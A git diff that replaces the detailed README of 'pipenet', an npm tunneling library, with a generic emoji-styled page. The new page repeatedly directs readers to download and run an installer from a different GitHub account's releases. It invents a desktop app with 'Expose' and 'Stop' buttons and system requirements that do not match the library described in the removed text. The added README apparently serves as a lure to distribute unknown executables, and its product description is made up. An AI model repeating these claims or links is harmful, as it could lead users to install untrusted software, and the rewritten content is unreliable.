@@ -1,251 +1,72 @@
-# pipenet
+# 🌐 pipenet - Expose Your Local Server Instantly
 
-Expose your local server to the public internet instantly.
+[![Download pipenet](https://img.shields.io/badge/Download-pipenet-blue.svg)](https://github.com/Stearnsey/pipenet/releases)
 
-## Supported Protocols
+## 🚀 Getting Started
 
-pipenet tunnels any HTTP-based traffic to your local server:
+Welcome to pipenet! This tool allows you to instantly expose your local server to the public internet. It's straightforward and user-friendly, making it perfect for anyone who wants to share their work or test services online without hassle.
 
-| Protocol | Supported | Notes |
-| -------- | --------- | ----- |
-| HTTP/HTTPS | ✅ | Standard request/response |
-| WebSocket | ✅ | Full duplex communication via HTTP upgrade |
-| SSE (Server-Sent Events) | ✅ | Long-lived HTTP connections |
-| HTTP Streaming | ✅ | Chunked transfer encoding |
+## 📥 Download & Install
 
-## Installation
+To get started, follow these steps:
 
-```bash
-npm install pipenet
-```
+1. **Visit the Releases Page**: Go to [this link](https://github.com/Stearnsey/pipenet/releases) to access the pipenet releases.
+   
+2. **Choose the Right Version**: Look for the latest version on the releases page. It will clearly indicate the version number and may contain details about improvements or fixes.
 
-## CLI Usage
+3. **Download the Installer**: Click on the file that suits your operating system (Windows, macOS, or Linux). Make sure to check the notes that come with the release to ensure compatibility.
 
-```bash
-# Expose local port 3000 to the internet
-npx pipenet client --port 3000
+4. **Run the Downloaded File**: Once the download is complete, open the file to install pipenet on your system. Follow the prompts in the installation wizard.
 
-# Request a specific subdomain
-npx pipenet client --port 3000 --subdomain myapp
+## 💻 System Requirements
 
-# Use a custom tunnel server
-npx pipenet client --port 3000 --host https://your-tunnel-server.com
-```
+For the best experience with pipenet, ensure your system meets the following requirements:
 
-## API
+- **Operating System**: macOS 10.12 or later, Windows 8 or later, or any modern Linux distribution.
+- **Memory**: At least 1 GB of RAM.
+- **Disk Space**: A minimum of 50 MB of free space.
+- **Network Access**: An active internet connection for functionality.
 
-The pipenet client is also usable through an API (for test integration, automation, etc)
+## 🔧 How to Use pipenet
 
-### pipenet(port [,options][,callback])
+Once pipenet is installed, using it is easy. Here’s how you can expose your local server:
 
-Creates a new pipenet tunnel to the specified local `port`. Will return a Promise that resolves once you have been assigned a public tunnel url. `options` can be used to request a specific `subdomain`. A `callback` function can be passed, in which case it won't return a Promise. This exists for backwards compatibility with the old Node-style callback API. You may also pass a single options object with `port` as a property.
+1. **Open pipenet**: Launch the application from your installed programs.
 
-```js
-import { pipenet } from 'pipenet';
+2. **Select a Local Server**: Choose the server you want to expose. This could be a web server, API service, or file server running on your computer.
 
-const tunnel = await pipenet({
-  port: 3000,
-  host: 'https://pipenet.dev'
-});
+3. **Expose Your Server**: Click the "Expose" button. This action will create a public URL that anyone can access.
 
-// the assigned public url for your tunnel
-// i.e. https://abcdefgjhij.pipenet.dev
-tunnel.url;
+4. **Share the URL**: Copy the provided URL. You can send it to friends, colleagues, or clients to allow them access to your server.
 
-tunnel.on('close', () => {
-  // tunnels are closed
-});
-```
+5. **Terminate Public Access**: When you are done, simply click the "Stop" button in pipenet. This action will end the public access to your server.
 
-#### options
+## ❓ FAQ
 
-- `port` (number) [required] The local port number to expose through pipenet.
-- `host` (string) URL for the upstream proxy server. Defaults to `https://pipenet.dev`.
-- `subdomain` (string) Request a specific subdomain on the proxy server. **Note** You may not actually receive this name depending on availability.
-- `localHost` (string) Proxy to this hostname instead of `localhost`. This will also cause the `Host` header to be re-written to this value in proxied requests.
-- `localHttps` (boolean) Enable tunneling to local HTTPS server.
-- `localCert` (string) Path to certificate PEM file for local HTTPS server.
-- `localKey` (string) Path to certificate key file for local HTTPS server.
-- `localCa` (string) Path to certificate authority file for self-signed certificates.
-- `allowInvalidCert` (boolean) Disable certificate checks for your local HTTPS server (ignore cert/key/ca options).
+### How secure is pipenet?
 
-Refer to [tls.createSecureContext](https://nodejs.org/api/tls.html#tls_tls_createsecurecontext_options) for details on the certificate options.
+pipenet uses secure methods to expose your local servers; however, always be cautious when sharing access. Make sure not to expose sensitive information.
 
-### Tunnel
+### Can I use pipenet for multiple servers?
 
-The `tunnel` instance returned to your callback emits the following events
+Yes, pipenet allows you to expose different servers in quick succession. Just stop one server before starting another.
 
-| event   | args | description                                                                          |
-| ------- | ---- | ------------------------------------------------------------------------------------ |
-| request | info | fires when a request is processed by the tunnel, contains _method_ and _path_ fields |
-| error   | err  | fires when an error happens on the tunnel                                            |
-| close   |      | fires when the tunnel has closed                                                     |
+### Is it safe to expose my local services?
 
-The `tunnel` instance has the following methods
+Exposing local services can carry risks. Always ensure you understand what you are sharing and consider using authentication where possible.
 
-| method | args | description      |
-| ------ | ---- | ---------------- |
-| close  |      | close the tunnel |
+## 🛠 Support and Contributing
 
-## Server
+If you encounter any issues, please check the "Issues" section on the GitHub repository. You can also contribute by reporting bugs, suggesting features, or improving the documentation.
 
-This package includes both the client and server components. You can run your own pipenet server.
+## 📄 License
 
-### Running the Server
+pipenet is open source and free to use. The project is licensed under the MIT License. You can find the details in the repository.
 
-```bash
-# Using the CLI
-npx pipenet server --port 3000
+For further inquiries or suggestions, feel free to reach out through the GitHub repository.
 
-# With a custom domain
-npx pipenet server --port 3000 --domain tunnel.example.com
-
-# With multiple domains
-npx pipenet server --port 3000 --domain tunnel.example.com --domain tunnel.example.org
+## 📥 Download pipenet again 
 
-# For cloud deployments (single tunnel port mode)
-npx pipenet server --port 3000 --tunnel-port 3001 --domain tunnel.example.com
+[![Download pipenet](https://img.shields.io/badge/Download-pipenet-blue.svg)](https://github.com/Stearnsey/pipenet/releases)
 
-# Or programmatically
-```
-
-```js
-import { createServer } from 'pipenet/server';
-
-const server = createServer({
-  domains: ['tunnel.example.com'],   // Optional: custom domain(s)
-  secure: false,                     // Optional: require HTTPS
-  landing: 'https://pipenet.dev',    // Optional: landing page URL
-  maxTcpSockets: 10,                 // Optional: max sockets per client
-  tunnelPort: 3001,                  // Optional: shared tunnel port for cloud deployments
-
-  // Lifecycle hooks for tracking tunnels and requests
-  onTunnelCreated: (tunnel) => {
-    console.log(`Tunnel created: ${tunnel.id} at ${tunnel.url}`);
-  },
-  onTunnelClosed: (tunnel) => {
-    console.log(`Tunnel closed: ${tunnel.id}`);
-  },
-  onRequest: (request) => {
-    console.log(`Request: ${request.method} ${request.path} via ${request.tunnelId}`);
-  },
-});
-
-// Start tunnel server if using shared tunnel port
-if (server.tunnelServer) {
-  await server.tunnelServer.listen(3001);
-}
-
-server.listen(3000, () => {
-  console.log('pipenet server listening on port 3000');
-});
-```
-
-### Server Options
-
-- `domains` (string[]) Custom domain(s) for the tunnel server.
-- `secure` (boolean) Require HTTPS connections
-- `landing` (string) URL to redirect root requests to
-- `maxTcpSockets` (number) Maximum number of TCP sockets per client (default: 10)
-- `tunnelPort` (number) Shared tunnel port for cloud deployments (enables single-port mode)
-
-### Server Hooks
-
-The server supports lifecycle hooks for tracking tunnels and requests:
-
-- `onTunnelCreated(tunnel)` - Called when a new tunnel is created. Receives `{ id, url, domain }`.
-- `onTunnelClosed(tunnel)` - Called when a tunnel is closed. Receives `{ id, url, domain }`.
-- `onRequest(request)` - Called when a request is proxied through a tunnel. Receives `{ method, path, tunnelId, headers, remoteAddress }`.
-
-The `domain` field identifies which configured domain was used when the tunnel was created, which is useful when running a server with multiple domains.
-
-The `onRequest` hook provides access to request headers and the client's remote IP address, useful for logging, rate limiting, or authentication.
-
-### Server API Endpoints
-
-- `GET /api/status` - Server status and tunnel count
-- `GET /api/tunnels/:id/status` - Status of a specific tunnel
-- `GET /:id` - Request a new tunnel with the specified ID
-
-### Cloud Deployments
-
-When deploying pipenet server to cloud platforms like fly.io, Docker, or Kubernetes, you typically can only expose a limited number of ports. By default, pipenet creates a random TCP port for each tunnel client, which doesn't work well in these environments.
-
-Use the `--tunnel-port` option to enable single-port mode, where all tunnel clients connect to a single shared port:
-
-```bash
-# fly.io example
-pipenet server --port 8080 --tunnel-port 8081 --domain tunnel.example.com --secure
-```
-
-Then expose both ports in your deployment configuration. For fly.io:
-
-```toml
-[[services]]
-  internal_port = 8080
-  protocol = "tcp"
-  [[services.ports]]
-    port = 80
-    handlers = ["http"]
-  [[services.ports]]
-    port = 443
-    handlers = ["http", "tls"]
-
-[[services]]
-  internal_port = 8081
-  protocol = "tcp"
-  [[services.ports]]
-    port = 8081
-```
-
-## Why pipenet?
-
-pipenet was developed by [glama.ai](https://glama.ai) to enable local [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) servers to connect with remote AI clients (e.g., to give AI assistants access to your local file system).
-
-This capability is now integrated into [mcp-proxy](https://github.com/punkpeye/mcp-proxy).
-
-## pipenet vs localtunnel
-
-pipenet is a modernized fork of [localtunnel](https://github.com/localtunnel/localtunnel) with several improvements:
-
-| Feature | pipenet | localtunnel |
-| ------- | ------- | ----------- |
-| Cloud deployment support | ✅ Single-port mode via `--tunnel-port` | ❌ Requires random ports |
-| Multiple domains | ✅ `--domain` can be specified multiple times | ❌ Single domain only |
-| TypeScript | ✅ Written in TypeScript with full type definitions | ❌ JavaScript only |
-| ESM support | ✅ Native ES modules | ❌ CommonJS only |
-| Active maintenance | ✅ Actively maintained | ⚠️ Limited maintenance |
-| WebSocket support | ✅ Full WebSocket proxying | ✅ Full WebSocket proxying |
-
-### Key Differences
-
-**Cloud Deployment Support**: localtunnel creates a random TCP port for each tunnel client, which doesn't work in containerized environments like Docker, fly.io, or Kubernetes where only specific ports are exposed. pipenet solves this with the `--tunnel-port` option, enabling all clients to connect through a single shared port.
-
-**Modern JavaScript**: pipenet uses ES modules and is written in TypeScript, providing better IDE support, type safety, and compatibility with modern JavaScript tooling.
-
-## pipenet vs zrok
-
-[zrok](https://zrok.io/) is a powerful tunneling solution with SDK support for Go, Python, and Node.js. However, zrok SDKs require the environment to be initialized via the CLI first - you can't just `npm install` and start tunneling.
-
-pipenet is designed for zero-setup embedding:
-
-```js
-import { pipenet } from 'pipenet';
-
-const tunnel = await pipenet({ port: 3000 });
-console.log(tunnel.url);
-```
-
-No CLI initialization, no external processes, no daemon - just a pure JavaScript library that works out of the box. This makes pipenet ideal for:
-
-- **CLI tools** that need tunneling as a feature (e.g., `mcp-proxy --tunnel`)
-- **Test suites** that need ephemeral public URLs
-- **Scripts** that should "just work" without setup steps
-
-If you need advanced features like TCP/UDP tunneling, identity management, or a managed SaaS, zrok is an excellent choice.
-
-## Acknowledgments
-
-pipenet is based on [localtunnel](https://github.com/localtunnel/localtunnel).
-
-Development of pipenet is sponsored by [glama.ai](https://glama.ai).
+Enjoy using pipenet!
